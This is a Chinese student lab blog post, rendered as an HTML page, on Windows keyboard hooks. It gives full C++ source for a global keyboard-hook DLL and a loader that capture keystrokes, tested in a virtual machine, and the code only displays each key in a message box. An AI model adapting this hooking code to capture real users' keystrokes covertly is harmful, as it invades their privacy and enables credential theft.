@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>键盘钩子 | AMY&#39;s BLOG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="键盘钩子系统消息机制​    Windows 是一个消息驱动的系统，在Windows中发生的一切都可以用消息来表示，消息用于告诉操作系统发生了什么，它提供了应用程序之间、应用程序与Windows 系统之间进行通信的手段。一个消息是由消息的名称和两个参数组成的。当应用程序想要实现的功能时，会由消息来触发，并且靠对消息的响应和处理来完成，比如本次实验中的键盘输入。 消息钩子实现原理​    消息钩子对">
+<meta property="og:type" content="article">
+<meta property="og:title" content="键盘钩子">
+<meta property="og:url" content="https://amy-ccc098.github.io/2022/04/25/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/index.html">
+<meta property="og:site_name" content="AMY&#39;s BLOG">
+<meta property="og:description" content="键盘钩子系统消息机制​    Windows 是一个消息驱动的系统，在Windows中发生的一切都可以用消息来表示，消息用于告诉操作系统发生了什么，它提供了应用程序之间、应用程序与Windows 系统之间进行通信的手段。一个消息是由消息的名称和两个参数组成的。当应用程序想要实现的功能时，会由消息来触发，并且靠对消息的响应和处理来完成，比如本次实验中的键盘输入。 消息钩子实现原理​    消息钩子对">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps95D1.tmp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps95D2.tmp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps95D3.tmp.jpg">
+<meta property="article:published_time" content="2022-04-25T02:10:58.000Z">
+<meta property="article:modified_time" content="2022-04-25T02:11:33.256Z">
+<meta property="article:author" content="CAIMI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps95D1.tmp.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="AMY&#39;s BLOG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">AMY&#39;s BLOG</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://Amy-CCC098.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-键盘钩子/键盘钩子" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/04/25/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/" class="article-date">
+  <time datetime="2022-04-25T02:10:58.000Z" itemprop="datePublished">2022-04-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      键盘钩子
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+        
+        <h2 id="键盘钩子"><a href="#键盘钩子" class="headerlink" title="键盘钩子"></a>键盘钩子</h2><h3 id="系统消息机制"><a href="#系统消息机制" class="headerlink" title="系统消息机制"></a>系统消息机制</h3><p>​    Windows 是一个消息驱动的系统，在Windows中发生的一切都可以用消息来表示，消息用于告诉操作系统发生了什么，它提供了应用程序之间、应用程序与Windows 系统之间进行通信的手段。一个消息是由消息的名称和两个参数组成的。当应用程序想要实现的功能时，会由消息来触发，并且靠对消息的响应和处理来完成，比如本次实验中的键盘输入。</p>
+<h3 id="消息钩子实现原理"><a href="#消息钩子实现原理" class="headerlink" title="消息钩子实现原理"></a>消息钩子实现原理</h3><p>​    消息钩子对应用程序进行拦截并处理Windows消息或指定事件，当指定的消息发出后，hook程序就可以在消息到达目标窗口之前将其捕获，从而得到对消息的控制权。消息钩子可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理，比如监控到日志，截获键盘、鼠标输入等。</p>
+<h3 id="编写键盘钩子程序，实现记录用户按键"><a href="#编写键盘钩子程序，实现记录用户按键" class="headerlink" title="编写键盘钩子程序，实现记录用户按键"></a>编写键盘钩子程序，实现记录用户按键</h3><ul>
+<li>编写键盘钩子dll，导出startHook, stopHook两个函数，并完成消息过滤处理函数</li>
+<li>编写加载程序，实现调用startHook，退出时调用stopHook</li>
+</ul>
+<p>（1）编写代码</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps95D1.tmp.jpg" alt="img"> </p>
+<p>（2）将得到的程序复制到虚拟机</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps95D2.tmp.jpg" alt="img"> </p>
+<p>（3）打开记事本，运行程序，发现键盘被记录</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps95D3.tmp.jpg" alt="img"> </p>
+<h3 id="记录程序源代码："><a href="#记录程序源代码：" class="headerlink" title="记录程序源代码："></a>记录程序源代码：</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">键盘钩子dll:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYLIBAPI_DLL</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;dll.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HINSTANCE	hDll;</span><br><span class="line">HHOOK		hHook;</span><br><span class="line"></span><br><span class="line"><span class="function">PCSTR	<span class="title">GetKeyName</span><span class="params">(<span class="keyword">int</span> nCode)</span></span>;</span><br><span class="line"><span class="function">BOOL	<span class="title">UnHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>		<span class="title">RecordKey</span><span class="params">(LPARAM lParam)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(<span class="keyword">void</span>* _HDllHandle, <span class="keyword">unsigned</span> _Reason, <span class="keyword">void</span>* _Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span> (_Reason)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		hDll = (HINSTANCE)_HDllHandle;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		hDll = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>	TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wPara, LPARAM lPara)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (nCode &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(hHook, nCode, wPara, lPara);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == (UINT)lPara &gt;&gt; <span class="number">31</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">RecordKey</span>(lPara);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>	<span class="built_in">CallNextHookEx</span>(hHook, nCode, wPara, lPara);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">MYLIBAPI BOOL <span class="title">StartHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	hHook = <span class="built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, hDll, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hHook)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>	FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>	TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">MYLIBAPI BOOL <span class="title">UnHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">UnhookWindowsHookEx</span>(hHook);</span><br><span class="line">	<span class="keyword">return</span>	TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">RecordKey</span><span class="params">(LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	TCHAR	szKeyName[<span class="number">50</span>];</span><br><span class="line">	<span class="built_in">GetKeyNameText</span>((LONG)lParam, szKeyName, <span class="number">50</span>);</span><br><span class="line">	<span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, szKeyName, <span class="string">&quot;全局键盘钩子&quot;</span>, MB_OK);</span><br><span class="line">	<span class="keyword">return</span>	<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">加载程序Loader:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(*StartHook)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(*UNHOOK)</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in <span class="keyword">int</span> nShowCmd )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	StartHook	Myfunction;</span><br><span class="line">	UNHOOK		UnHook;</span><br><span class="line">	HMODULE		hDll = <span class="built_in">LoadLibrary</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Dll.dll&quot;</span>));</span><br><span class="line">	Myfunction = (StartHook)<span class="built_in">GetProcAddress</span>(hDll,<span class="string">&quot;StartHook&quot;</span>);</span><br><span class="line">	UnHook = (UNHOOK)<span class="built_in">GetProcAddress</span>(hDll,<span class="string">&quot;UnHook&quot;</span>);</span><br><span class="line">	(*Myfunction)();</span><br><span class="line">	<span class="built_in">MessageBox</span>(<span class="literal">NULL</span>,<span class="built_in">TEXT</span>(<span class="string">&quot;挂钩开始,点击确定取消钩子！&quot;</span>),<span class="built_in">TEXT</span>(<span class="string">&quot;钩子&quot;</span>),MB_OK);</span><br><span class="line">	<span class="built_in">UnHook</span>();</span><br><span class="line">	<span class="keyword">return</span>	<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+     
+   </div>
+    <footer class="article-footer">
+      <a data-url="https://amy-ccc098.github.io/2022/04/25/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/" data-id="cl2e337ik001as8vs0fok6koi" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/04/15/%E5%90%8E%E9%97%A8%E5%BC%80%E5%8F%91/%E5%90%8E%E9%97%A8%E5%BC%80%E5%8F%91/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">后门开发</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cisp/" rel="tag">cisp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/memo/" rel="tag">memo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E6%8E%A7/" rel="tag">工控</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/cisp/" style="font-size: 10px;">cisp</a> <a href="/tags/memo/" style="font-size: 13.33px;">memo</a> <a href="/tags/python/" style="font-size: 16.67px;">python</a> <a href="/tags/study/" style="font-size: 20px;">study</a> <a href="/tags/tools/" style="font-size: 16.67px;">tools</a> <a href="/tags/%E5%B7%A5%E6%8E%A7/" style="font-size: 10px;">工控</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/04/25/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/">键盘钩子</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/15/%E5%90%8E%E9%97%A8%E5%BC%80%E5%8F%91/%E5%90%8E%E9%97%A8%E5%BC%80%E5%8F%91/">后门开发</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/03/wireshark%E7%9A%84%E4%BD%BF%E7%94%A8/wireshark%E7%9A%84%E4%BD%BF%E7%94%A8/">wireshark的使用</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/19/python%E5%85%A5%E9%97%A8/python%E5%85%A5%E9%97%A8/">python入门</a>
+          </li>
+        
+          <li>
+            <a href="/2022/03/16/Windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB%E3%80%90%E9%98%B2%E5%BF%98%E3%80%91/Windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%B1%87%E6%80%BB%E3%80%90%E9%98%B2%E5%BF%98%E3%80%91/">Windows命令行汇总【防忘】</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 CAIMI<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":250,"height":400},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
